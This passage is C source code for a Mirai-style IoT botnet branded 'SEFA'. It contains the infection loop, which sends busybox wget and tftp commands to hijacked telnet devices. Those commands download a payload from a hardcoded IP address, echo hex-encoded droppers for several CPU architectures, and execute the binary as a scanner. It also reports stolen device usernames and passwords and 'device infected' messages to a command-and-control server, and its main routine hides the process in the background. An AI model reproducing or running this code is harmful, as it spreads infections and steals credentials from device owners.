                            if(util_sock_print(fds[i].fd, "/bin/busybox wget http://%d.%d.%d.%d/bins/%s.%s -O - > EfJinSton; /bin/busybox chmod 777 EfJinSton\r\n", 213,183,48,185, "sefa", fds[i].arch) < 0)
                            {
                              close(fds[i].fd);
                              fds[i].complete = 1;
                              fds[i].total_timeout = 0;
                              fds[i].state = SETUP_CONNECTION;
                              continue;
                            }
                            sc_change_state(&fds[i], EXECUTE_FILE);
                        }
                        break;

                        case UPLOAD_TFTP:
                        {
                          if(util_sock_print(server.socket, "\e[95mSEFA \e[97m| \e[96m%d.%d.%d.%d:23 %s:%s (%s) is using TFTP\r\n", fds[i].ip & 0xff, (fds[i].ip >> 8) & 0xff, (fds[i].ip >> 16) & 0xff, (fds[i].ip >> 24) & 0xff, fds[i].auth->username, fds[i].auth->password, fds[i].arch) < 0)
                          {
                            close(fds[i].fd);
                            fds[i].complete = 1;
                            fds[i].total_timeout = 0;
                            fds[i].state = SETUP_CONNECTION;
                            continue;
                          }
                            if(util_sock_print(fds[i].fd, "/bin/busybox tftp -g -l EfJinSton -r %s.%s %d.%d.%d.%d; /bin/busybox chmod 777 EfJinSton\r\n", "sefa", fds[i].arch, 213,183,48,185) < 0)
                            {
                              close(fds[i].fd);
                              fds[i].complete = 1;
                              fds[i].total_timeout = 0;
                              fds[i].state = SETUP_CONNECTION;
                              continue;
                            }
                            sc_change_state(&fds[i], EXECUTE_FILE);
                        }
                        break;

                        case UPLOAD_ECHO:
                        {
                          if(util_sock_print(server.socket, "\e[95mSEFA \e[97m| \e[96m%d.%d.%d.%d:23 %s:%s (%s) is using ECHO\r\n", fds[i].ip & 0xff, (fds[i].ip >> 8) & 0xff, (fds[i].ip >> 16) & 0xff, (fds[i].ip >> 24) & 0xff, fds[i].auth->username, fds[i].auth->password, fds[i].arch) < 0)
                          {
                            close(fds[i].fd);
                            fds[i].complete = 1;
                            fds[i].total_timeout = 0;
                            fds[i].state = SETUP_CONNECTION;
                            continue;
                          }
                            sc_change_state(&fds[i], PREPARE_ECHO);
                        }
                        break;
                    }
                }
                break;

                case PREPARE_ECHO:
                {
                    if(util_sock_print(fds[i].fd, "/bin/busybox cp EfJinSton sefDrop; > sefDrop; /bin/busybox chmod 777 sefDrop\r\n") < 0)
                    {
                      close(fds[i].fd);
                      fds[i].complete = 1;
                      fds[i].total_timeout = 0;
                      fds[i].state = SETUP_CONNECTION;
                      continue;
                      }

                      sc_change_state(&fds[i], DROP_ECHO_DLR);
                }
                break;

                case DROP_ECHO_DLR:
                {
                    int is_first = 0;

                    if(strcmp(fds[i].arch, "arc") == 0) {
                      close(fds[i].fd);
                      fds[i].complete = 1;
                      fds[i].total_timeout = 0;
                      fds[i].state = SETUP_CONNECTION;
                      continue;
                    }

                    if(strcmp(fds[i].arch, "mpsl") == 0)
                    {
                        for(j = 0; j < MPSL_HEX_LINES; j++)
                        {
                            if(is_first == 0)
                            {
                                if(util_sock_print(fds[i].fd, "echo -ne '%s' >> sefDrop\r\n", mpsl_dlr[j]) < 0)
                                {
                                  close(fds[i].fd);
                                  fds[i].complete = 1;
                                  fds[i].total_timeout = 0;
                                  fds[i].state = SETUP_CONNECTION;
                                  continue;
                                }

                                #ifdef DEBUG
                                    printf("dbg: echo dropped first line [%d/%d:%s]\n", j - 1, MPSL_HEX_LINES, fds[i].arch);
                                #endif

                                sleep(1);
                                is_first = 1;
                                continue;
                            }

                            if(util_sock_print(fds[i].fd, "echo -ne '%s' >> sefDrop\r\n", mpsl_dlr[j]) < 0)
                            {
                              close(fds[i].fd);
                              fds[i].complete = 1;
                              fds[i].total_timeout = 0;
                              fds[i].state = SETUP_CONNECTION;
                              continue;
                            }

                            #ifdef DEBUG
                                printf("dbg: echo dropped line [%d/%d:%s]\n", j - 1, MPSL_HEX_LINES, fds[i].arch);
                            #endif

                            sleep(1);
                            continue;
                        }
                        sc_change_state(&fds[i], EXECUTE_DLR);
                    }
                    if(strcmp(fds[i].arch, "mips") == 0)
                    {
                        for(j = 0; j < MIPS_HEX_LINES; j++)
                        {
                            if(is_first == 0)
                            {
                                if(util_sock_print(fds[i].fd, "echo -ne '%s' >> sefDrop\r\n", mips_dlr[j]) < 0)
                                {
                                  close(fds[i].fd);
                                  fds[i].complete = 1;
                                  fds[i].total_timeout = 0;
                                  fds[i].state = SETUP_CONNECTION;
                                  continue;
                                }

                                #ifdef DEBUG
                                    printf("dbg: echo dropped first line [%d/%d:%s]\n", j - 1, MIPS_HEX_LINES, fds[i].arch);
                                #endif

                                sleep(1);
                                is_first = 1;
                                continue;
                            }

                            if(util_sock_print(fds[i].fd, "echo -ne '%s' >> sefDrop\r\n", mips_dlr[j]) < 0)
                            {
                              close(fds[i].fd);
                              fds[i].complete = 1;
                              fds[i].total_timeout = 0;
                              fds[i].state = SETUP_CONNECTION;
                              continue;
                            }

                            #ifdef DEBUG
                                printf("dbg: echo dropped line [%d/%d:%s]\n", j - 1, MIPS_HEX_LINES, fds[i].arch);
                            #endif

                            sleep(1);
                            continue;
                        }
                        sc_change_state(&fds[i], EXECUTE_DLR);
                    }
                    if(strcmp(fds[i].arch, "arm") == 0)
                    {
                        for(j = 0; j < ARM_HEX_LINES; j++)
                        {
                            if(is_first == 0)
                            {
                                if(util_sock_print(fds[i].fd, "echo -ne '%s' >> sefDrop\r\n", arm_dlr[j]) < 0)
                                {
                                  close(fds[i].fd);
                                  fds[i].complete = 1;
                                  fds[i].total_timeout = 0;
                                  fds[i].state = SETUP_CONNECTION;
                                  continue;
                                }

                                #ifdef DEBUG
                                    printf("dbg: echo dropped first line [%d/%d:%s]\n", j - 1, ARM_HEX_LINES, fds[i].arch);
                                #endif

                                sleep(1);
                                is_first = 1;
                                continue;
                            }

                            if(util_sock_print(fds[i].fd, "echo -ne '%s' >> sefDrop\r\n", arm_dlr[j]) < 0)
                            {
                              close(fds[i].fd);
                              fds[i].complete = 1;
                              fds[i].total_timeout = 0;
                              fds[i].state = SETUP_CONNECTION;
                              continue;
                            }

                            #ifdef DEBUG
                                printf("dbg: echo dropped line [%d/%d:%s]\n", j - 1, ARM_HEX_LINES, fds[i].arch);
                            #endif

                            sleep(1);
                            continue;
                        }
                        sc_change_state(&fds[i], EXECUTE_DLR);
                    }
                    if(strcmp(fds[i].arch, "arm5") == 0)
                    {
                        for(j = 0; j < ARM_HEX_LINES; j++)
                        {
                            if(is_first == 0)
                            {
                                if(util_sock_print(fds[i].fd, "echo -ne '%s' >> sefDrop\r\n", arm5_dlr[j]) < 0)
                                {
                                  close(fds[i].fd);
                                  fds[i].complete = 1;
                                  fds[i].total_timeout = 0;
                                  fds[i].state = SETUP_CONNECTION;
                                  continue;
                                }

                                #ifdef DEBUG
                                    printf("dbg: echo dropped first line [%d/%d:%s]\n", j - 1, ARM5_HEX_LINES, fds[i].arch);
                                #endif

                                sleep(1);
                                is_first = 1;
                                continue;
                            }

                            if(util_sock_print(fds[i].fd, "echo -ne '%s' >> sefDrop\r\n", arm5_dlr[j]) < 0)
                            {
                              close(fds[i].fd);
                              fds[i].complete = 1;
                              fds[i].total_timeout = 0;
                              fds[i].state = SETUP_CONNECTION;
                              continue;
                            }

                            #ifdef DEBUG
                                printf("dbg: echo dropped line [%d/%d:%s]\n", j - 1, ARM5_HEX_LINES, fds[i].arch);
                            #endif

                            sleep(1);
                            continue;
                        }
                        sc_change_state(&fds[i], EXECUTE_DLR);
                    }
                    if(strcmp(fds[i].arch, "arm6") == 0)
                    {
                        for(j = 0; j < ARM6_HEX_LINES; j++)
                        {
                            if(is_first == 0)
                            {
                                if(util_sock_print(fds[i].fd, "echo -ne '%s' >> sefDrop\r\n", arm6_dlr[j]) < 0)
                                {
                                  close(fds[i].fd);
                                  fds[i].complete = 1;
                                  fds[i].total_timeout = 0;
                                  fds[i].state = SETUP_CONNECTION;
                                  continue;
                                }

                                #ifdef DEBUG
                                    printf("dbg: echo dropped first line [%d/%d:%s]\n", j - 1, ARM6_HEX_LINES, fds[i].arch);
                                #endif

                                sleep(1);
                                is_first = 1;
                                continue;
                            }

                            if(util_sock_print(fds[i].fd, "echo -ne '%s' >> sefDrop\r\n", arm6_dlr[j]) < 0)
                            {
                              close(fds[i].fd);
                              fds[i].complete = 1;
                              fds[i].total_timeout = 0;
                              fds[i].state = SETUP_CONNECTION;
                              continue;
                            }

                            #ifdef DEBUG
                                printf("dbg: echo dropped line [%d/%d:%s]\n", j - 1, ARM6_HEX_LINES, fds[i].arch);
                            #endif

                            sleep(1);
                            continue;
                        }
                        sc_change_state(&fds[i], EXECUTE_DLR);
                    }
                    if(strcmp(fds[i].arch, "arm7") == 0)
                    {
                        for(j = 0; j < ARM7_HEX_LINES; j++)
                        {
                            if(is_first == 0)
                            {
                                if(util_sock_print(fds[i].fd, "echo -ne '%s' >> sefDrop\r\n", arm7_dlr[j]) < 0)
                                {
                                  close(fds[i].fd);
                                  fds[i].complete = 1;
                                  fds[i].total_timeout = 0;
                                  fds[i].state = SETUP_CONNECTION;
                                  continue;
                                }

                                #ifdef DEBUG
                                    printf("dbg: echo dropped first line [%d/%d:%s]\n", j - 1, ARM7_HEX_LINES, fds[i].arch);
                                #endif

                                sleep(1);
                                is_first = 1;
                                continue;
                            }

                            if(util_sock_print(fds[i].fd, "echo -ne '%s' >> sefDrop\r\n", arm7_dlr[j]) < 0)
                            {
                              close(fds[i].fd);
                              fds[i].complete = 1;
                              fds[i].total_timeout = 0;
                              fds[i].state = SETUP_CONNECTION;
                              continue;
                            }

                            #ifdef DEBUG
                                printf("dbg: echo dropped line [%d/%d:%s]\n", j - 1, ARM7_HEX_LINES, fds[i].arch);
                            #endif

                            sleep(1);
                            continue;
                        }
                        sc_change_state(&fds[i], EXECUTE_DLR);
                    }
                    if(strcmp(fds[i].arch, "x86") == 0)
                    {
                        for(j = 0; j < X86_HEX_LINES; j++)
                        {
                            if(is_first == 0)
                            {
                                if(util_sock_print(fds[i].fd, "echo -ne '%s' >> sefDrop\r\n", x86_dlr[j]) < 0)
                                {
                                  close(fds[i].fd);
                                  fds[i].complete = 1;
                                  fds[i].total_timeout = 0;
                                  fds[i].state = SETUP_CONNECTION;
                                  continue;
                                }

                                #ifdef DEBUG
                                    printf("dbg: echo dropped first line [%d/%d:%s]\n", j - 1, X86_HEX_LINES, fds[i].arch);
                                #endif

                                sleep(1);
                                is_first = 1;
                                continue;
                            }

                            if(util_sock_print(fds[i].fd, "echo -ne '%s' >> sefDrop\r\n", x86_dlr[j]) < 0)
                            {
                              close(fds[i].fd);
                              fds[i].complete = 1;
                              fds[i].total_timeout = 0;
                              fds[i].state = SETUP_CONNECTION;
                              continue;
                            }

                            #ifdef DEBUG
                                printf("dbg: echo dropped line [%d/%d:%s]\n", j - 1, X86_HEX_LINES, fds[i].arch);
                            #endif

                            sleep(1);
                            continue;
                        }
                        sc_change_state(&fds[i], EXECUTE_DLR);
                    }
                    if(strcmp(fds[i].arch, "spc") == 0)
                    {
                        for(j = 0; j < SPC_HEX_LINES; j++)
                        {
                            if(is_first == 0)
                            {
                                if(util_sock_print(fds[i].fd, "echo -ne '%s' >> sefDrop\r\n", spc_dlr[j]) < 0)
                                {
                                  close(fds[i].fd);
                                  fds[i].complete = 1;
                                  fds[i].total_timeout = 0;
                                  fds[i].state = SETUP_CONNECTION;
                                  continue;
                                }

                                #ifdef DEBUG
                                    printf("dbg: echo dropped first line [%d/%d:%s]\n", j - 1, SPC_HEX_LINES, fds[i].arch);
                                #endif

                                sleep(1);
                                is_first = 1;
                                continue;
                            }

                            if(util_sock_print(fds[i].fd, "echo -ne '%s' >> sefDrop\r\n", spc_dlr[j]) < 0)
                            {
                              close(fds[i].fd);
                              fds[i].complete = 1;
                              fds[i].total_timeout = 0;
                              fds[i].state = SETUP_CONNECTION;
                              continue;
                            }

                            #ifdef DEBUG
                                printf("dbg: echo dropped line [%d/%d:%s]\n", j - 1, SPC_HEX_LINES, fds[i].arch);
                            #endif

                            sleep(1);
                            continue;
                        }
                        sc_change_state(&fds[i], EXECUTE_DLR);
                    }
                    if(strcmp(fds[i].arch, "sh4") == 0)
                    {
                        for(j = 0; j < SH4_HEX_LINES; j++)
                        {
                            if(is_first == 0)
                            {
                                if(util_sock_print(fds[i].fd, "echo -ne '%s' >> sefDrop\r\n", sh4_dlr[j]) < 0)
                                {
                                  close(fds[i].fd);
                                  fds[i].complete = 1;
                                  fds[i].total_timeout = 0;
                                  fds[i].state = SETUP_CONNECTION;
                                  continue;
                                }

                                #ifdef DEBUG
                                    printf("dbg: echo dropped first line [%d/%d:%s]\n", j - 1, SH4_HEX_LINES, fds[i].arch);
                                #endif

                                sleep(1);
                                is_first = 1;
                                continue;
                            }

                            if(util_sock_print(fds[i].fd, "echo -ne '%s' >> sefDrop\r\n", sh4_dlr[j]) < 0)
                            {
                              close(fds[i].fd);
                              fds[i].complete = 1;
                              fds[i].total_timeout = 0;
                              fds[i].state = SETUP_CONNECTION;
                              continue;
                            }

                            #ifdef DEBUG
                                printf("dbg: echo dropped line [%d/%d:%s]\n", j - 1, SH4_HEX_LINES, fds[i].arch);
                            #endif

                            sleep(1);
                            continue;
                        }
                        sc_change_state(&fds[i], EXECUTE_DLR);
                    }
                    if(strcmp(fds[i].arch, "ppc") == 0)
                    {
                        for(j = 0; j < PPC_HEX_LINES; j++)
                        {
                            if(is_first == 0)
                            {
                                if(util_sock_print(fds[i].fd, "echo -ne '%s' >> sefDrop\r\n", ppc_dlr[j]) < 0)
                                {
                                  close(fds[i].fd);
                                  fds[i].complete = 1;
                                  fds[i].total_timeout = 0;
                                  fds[i].state = SETUP_CONNECTION;
                                  continue;
                                }

                                #ifdef DEBUG
                                    printf("dbg: echo dropped first line [%d/%d:%s]\n", j - 1, PPC_HEX_LINES, fds[i].arch);
                                #endif

                                sleep(1);
                                is_first = 1;
                                continue;
                            }

                            if(util_sock_print(fds[i].fd, "echo -ne '%s' >> sefDrop\r\n", ppc_dlr[j]) < 0)
                            {
                              close(fds[i].fd);
                              fds[i].complete = 1;
                              fds[i].total_timeout = 0;
                              fds[i].state = SETUP_CONNECTION;
                              continue;
                            }

                            #ifdef DEBUG
                                printf("dbg: echo dropped line [%d/%d:%s]\n", j - 1, PPC_HEX_LINES, fds[i].arch);
                            #endif

                            sleep(1);
                            continue;
                        }
                        sc_change_state(&fds[i], EXECUTE_DLR);
                    }
                    check_timeout(&fds[i], 30);
                }
                break;

                case EXECUTE_DLR:
                {
                    if(util_sock_print(fds[i].fd, "./sefDrop; chmod 777 EfJinSton\r\n") < 0)
                    {
                      close(fds[i].fd);
                      fds[i].complete = 1;
                      fds[i].total_timeout = 0;
                      fds[i].state = SETUP_CONNECTION;
                      continue;
                    }

                    #ifdef DEBUG
                        printf("dbg: dlr executed\n");
                    #endif

                    sc_change_state(&fds[i], EXECUTE_FILE);
                }
                break;

                case EXECUTE_FILE:
                {
                    if(util_sock_print(fds[i].fd, "./EfJinSton scanner\r\n") < 0)
                    {
                      close(fds[i].fd);
                      fds[i].complete = 1;
                      fds[i].total_timeout = 0;
                      fds[i].state = SETUP_CONNECTION;
                      continue;
                    }

                    #ifdef DEBUG
                        printf("dbg: file executed\n");
                    #endif

                    if(util_sock_print(server.socket, "\e[95mSEFA \e[97m| \e[96m%d.%d.%d.%d:23 sefa.%s executed\r\n", fds[i].ip & 0xff, (fds[i].ip >> 8) & 0xff, (fds[i].ip >> 16) & 0xff, (fds[i].ip >> 24) & 0xff, fds[i].arch) < 0)
                    {
                      close(fds[i].fd);
                      fds[i].complete = 1;
                      fds[i].total_timeout = 0;
                      fds[i].state = SETUP_CONNECTION;
                      continue;
                    }

                    sc_change_state(&fds[i], CONFIRM_INFECTION);
                }
                break;

                case CONFIRM_INFECTION:
                {
                    if(read_socket_buffer(fds[i].fd, 10, fds[i].sock_buffer, 1024, successful_exec))
                    {
                        #ifdef DEBUG
                            printf("dbg: device infected\n");
                        #endif

                        if(util_sock_print(server.socket, "\e[95mSEFA \e[97m| \e[96m%d.%d.%d.%d:23 device infected\r\n", fds[i].ip & 0xff, (fds[i].ip >> 8) & 0xff, (fds[i].ip >> 16) & 0xff, (fds[i].ip >> 24) & 0xff, fds[i].arch) < 0)
                        {
                          close(fds[i].fd);
                          fds[i].complete = 1;
                          fds[i].total_timeout = 0;
                          fds[i].state = SETUP_CONNECTION;
                          continue;
                        }

                        close(fds[i].fd);
                        fds[i].complete = 1;
                        fds[i].total_timeout = 0;
                        fds[i].state = SETUP_CONNECTION;
                        continue;
                    }
                    check_timeout(&fds[i], 10);
                }
                break;


            }
        }
    }
}

int main(int argc, char **argv)
{
  if (setup_signals() != 0)
    exit(EXIT_FAILURE);

  encryption_init();

  char client_name[256];
  get_client_name(argc, argv, client_name);

  create_peer(&server);
  while(connect_cnc(&server) != 0) {
#ifdef DEBUG
    printf("dbg: failed first connect, trying again\n");
#endif
    sleep(3);
    if(connect_cnc(&server) == 0) {
      break;
    }
  }

#ifdef DEBUG
  printf("dbg: connected to cnc\n");
#endif

  int flag = fcntl(STDIN_FILENO, F_GETFL, 0);
  flag |= O_NONBLOCK;
  fcntl(STDIN_FILENO, F_SETFL, flag);

  fd_set read_fds;
  fd_set write_fds;
  fd_set except_fds;

  int maxfd = server.socket;

  srand(time(NULL) ^ getpid());
  rand_init();

#ifndef WINDOWS
  write(1, encryption_decode(9, NULL), strlen(encryption_decode(9, NULL)));
  write(1, "\n", 1);
#endif

  signal(SIGPIPE, SIG_IGN);

#ifndef DEBUG
  if (fork() > 0)
    return 0;

  strcpy(argv[0], encryption_decode(51, NULL));

  chdir("/");
#endif

  ps_tracker_init();
  malware_tracker_init();

  while (1) {
    build_fd_sets(&server, &read_fds, &write_fds, &except_fds);

    int activity = select(maxfd + 1, &read_fds, &write_fds, &except_fds, NULL);

    switch (activity) {
      case -1:
#ifdef DEBUG
        printf("dbg: cnc err code -1\n");
#endif
        shutdown_properly(EXIT_FAILURE);

      case 0:
#ifdef DEBUG
      printf("dbg: cnc err code 0\n");
#endif
        shutdown_properly(EXIT_FAILURE);

      default:
        if (FD_ISSET(STDIN_FILENO, &except_fds)) {
#ifdef DEBUG
          printf("dbg: cnc err code STDIN_FILENO\n");
#endif
          shutdown_properly(EXIT_FAILURE);
        }

        if (FD_ISSET(server.socket, &write_fds)) {
          if (send_to_peer(&server) != 0)
          {
#ifdef DEBUG
            printf("dbg: cnc err code send_to_peer\n");
#endif
            shutdown_properly(EXIT_FAILURE);
          }
        }

        if (FD_ISSET(server.socket, &except_fds)) {
#ifdef DEBUG
          printf("dbg: cnc err code except_fds\n");
#endif
          shutdown_properly(EXIT_FAILURE);
        }

        char recvbuff[1024];
        int tmp;

        read_socket:
        while((tmp = read_socket_responce(server.socket, recvbuff, 1024)) != -1) {
          recvbuff[tmp] = 0x00;
#ifdef DEBUG
          printf("dbg: recv() - ENCRYPTED: %s\n", recvbuff);
#endif
          process_recv_data(recvbuff, strlen(recvbuff));
        }

        sleep(5);

#ifdef DEBUG
        printf("dbg: attemtping to reconnect\n");
#endif

        delete_peer(&server);
        create_peer(&server);

        while(connect_cnc(&server) != 0) {
          sleep(3);
        }
        goto read_socket;
     }
  }
  return 0;
}
